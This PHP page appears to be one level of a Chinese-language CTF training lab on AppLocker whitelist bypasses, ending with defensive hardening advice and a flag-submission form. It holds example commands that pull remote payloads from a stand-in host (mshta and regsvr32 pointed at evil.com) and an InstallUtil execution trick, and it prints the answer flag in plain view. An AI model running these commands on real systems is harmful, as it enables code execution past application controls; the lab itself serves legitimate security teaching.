<?php
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[250] = 'active open';  // parent menu index
$ACTIVE[284] = 'active';         // this page index
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';
$correct_flag = 'flag{OSEP_L12_AppLocker_Bypass_LOLBIN_Trusted}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    if (trim($_POST['user_flag']) === $correct_flag) {
        $_SESSION['osep_flags']['flag12'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius:8px;background:rgba(99,102,241,0.1);border:1px solid rgba(99,102,241,0.5);color:#fff;">✅ 恭喜通关！您已成功掌握 AppLocker 的运行机制及绕过方法。</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius:8px;background:rgba(244,63,94,0.1);border:1px solid rgba(244,63,94,0.5);color:#fff;">❌ Flag 错误，请检查输入！</div>';
    }
}
?>
<style>
/* dark theme with module color */
.ctf-stage-header { background: linear-gradient(135deg, #0c1218, #6366f1); border-radius:14px; padding:25px 30px; color:#fff; margin-bottom:25px; border:1px solid rgba(168,85,247,0.3); }
.step-box { background:var(--bg-card); border:1px solid var(--border-color); border-radius:12px; padding:24px; margin-bottom:22px; }
.step-title { font-size:16px; font-weight:700; color:var(--text-primary); margin-top:0; margin-bottom:14px; display:flex; align-items:center; gap:8px; }
.step-num { background:linear-gradient(135deg,#6366f1,#a855f7); color:#fff; width:26px; height:26px; border-radius:6px; display:inline-flex; align-items:center; justify-content:center; font-size:12px; font-weight:800; }
.cmd-box { background:#0f172a; border:1px solid #334155; border-radius:8px; padding:14px 18px; font-family:monospace; font-size:13px; color:#7dd3fc; margin:12px 0; overflow-x:auto; line-height:1.8; }
.cmd-box .comment { color:#64748b; }
.cmd-box .flag-text { color:#fbbf24; font-weight:bold; }
.highlight-box { background:rgba(168,85,247,0.08); border:1px solid rgba(168,85,247,0.25); border-radius:8px; padding:14px 18px; margin:12px 0; font-size:13px; color:var(--text-secondary); line-height:1.7; }
.flag-submit-area { background:var(--bg-card); border:2px dashed rgba(168,85,247,0.4); border-radius:12px; padding:24px; margin-top:25px; text-align:center; }
.nav-buttons { display: flex; justify-content: space-between; margin-top: 20px; }
.btn-nav { background: #6366f1; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; text-decoration: none; }
.btn-nav:hover { background: #a855f7; color: white; text-decoration: none; }
</style>

<div class="main-content"><div class="main-content-inner"><div class="page-content">

    <div class="ctf-stage-header">
        <h2 style="margin-top:0; font-size:24px; font-weight:bold; display:flex; align-items:center; gap:10px;">
            <i class="fa fa-lock"></i> 关卡 4: AppLocker 应用白名单绕过研究
        </h2>
        <p style="margin-bottom:0; opacity:0.9;">250 PTS · 学习应用控制策略的局限性及其绕过方法。</p>
    </div>

    <?= $flag_msg ?>

    <div class="step-box">
        <div class="step-title"><span class="step-num">1</span> AppLocker 策略结构</div>
        <p>AppLocker 旨在通过白名单限制企业网络中执行的文件，以防止未授权软件和恶意软件。它分为几类规则集：可执行文件、脚本、Windows Installer 和 DLL 规则。</p>
        <div class="highlight-box">
            默认安全规则常常允许：<br>
            • <code>%WINDIR%\*</code> 目录下的所有文件执行。<br>
            • <code>%PROGRAMFILES%\*</code> 目录下的所有文件执行。<br>
            • 某些受信任的 <b>Publishers (发布者)</b> 签名的文件。
        </div>
    </div>

    <div class="step-box">
        <div class="step-title"><span class="step-num">2</span> LOLBIN（Living Off The Land Binaries）绕过</div>
        <p>当 AppLocker 拦截了未签名或未知路径的 <code>.exe</code> 运行，攻击者可以利用系统中内置的白名单二进制文件（LOLBINs）来代为执行代码。</p>
        <p style="color:var(--text-secondary);">常见 LOLBIN 示例：</p>
        <div class="cmd-box">
            <span class="comment"># 使用 mshta 执行 HTA 脚本文件</span><br>
            mshta.exe http://evil.com/payload.hta<br><br>
            <span class="comment"># 使用 regsvr32 注册并执行远端 SCT 文件</span><br>
            regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll<br><br>
            <span class="comment"># 使用 wmic 甚至 certutil 等进行执行和下载</span><br>
        </div>
    </div>

    <div class="step-box">
        <div class="step-title"><span class="step-num">3</span> Trusted Path 写入绕过</div>
        <p>由于默认规则信任 <code>%WINDIR%</code> 或 <code>%ProgramFiles%</code>，如果攻击者能在这些受信任路径内找到<b>普通用户具有写入权限</b>的目录（如 <code>C:\Windows\Tasks</code> 或某些安装软件遗留配置错误的子目录），将恶意执行文件复制进去，便可以直接绕过路径限制运行。</p>
    </div>

    <div class="step-box">
        <div class="step-title"><span class="step-num">4</span> C#/InstallUtil 绕过原理</div>
        <p>某些具有微软签名的开发运维工具能被武器化用来执行恶意 C# 程序装配件。</p>
        <div class="cmd-box">
            <span class="comment"># 使用 InstallUtil 执行自定义 DLL/EXE 的 UnInstall 方法</span><br>
            C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U evil.exe
        </div>
        <p>这种方法绕过了 AppLocker 对 <code>.exe</code> 启动的拦截，因为实际启动的进程是拥有信任签名的 <code>InstallUtil.exe</code>，由其在内部反射加载并调用了我们编写的恶意方法。</p>
    </div>

    <div class="step-box">
        <div class="step-title"><span class="step-num">5</span> 防御增强</div>
        <p>为了有效防止应用控制策略被绕过，组织需要采取以下防御加固措施：</p>
        <div class="highlight-box">
            • <b>WDAC 替换:</b> 考虑使用 WDAC（Windows Defender Application Control），它提供更底层的内核级管控，安全性高于基于规则的 AppLocker。<br>
            • <b>启用 DLL 规则:</b> 大量绕过手法利用了 DLL 加载（如 regsvr32），开启 DLL 拦截能大幅提升防御，尽管可能影响性能。<br>
            • <b>PowerShell 约束语言模式:</b> 配合 AppLocker，将非信任脚本锁定在受限模式下，防止滥用 .NET 框架和 API。
        </div>
    </div>

    <div class="flag-submit-area">
        <h4 style="color:var(--text-primary); margin-bottom: 20px;">🚩 提交您的 Flag</h4>
        <form method="POST" style="max-width: 500px; margin: 0 auto; display: flex; gap: 10px;">
            <input type="text" name="user_flag" class="form-control" placeholder="输入 Flag，例如：flag{...}" style="flex: 1; border-radius: 8px; border: 1px solid rgba(168,85,247,0.3); background: var(--bg-card); color: var(--text-primary);">
            <button type="submit" name="check_flag" class="btn btn-nav" style="border-radius: 8px;">验证</button>
        </form>
        <div style="margin-top:20px; font-family:monospace; font-size:12px; color:var(--text-secondary);">
            实验环境提示：本关 Flag 已隐写在下方字符串中：<br>
            <span style="color:#64748b;">$flag = "flag{OSEP_L12_AppLocker_Bypass_LOLBIN_Trusted}";</span>
        </div>
    </div>

    <div class="nav-buttons">
        <a href="osep_l11_amsi_bypass.php" class="btn-nav"><i class="fa fa-arrow-left"></i> 上一关：L11 AMSI 绕过</a>
        <a href="#" class="btn-nav">下一关：结束 <i class="fa fa-arrow-right"></i></a>
    </div>

</div></div></div>
<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
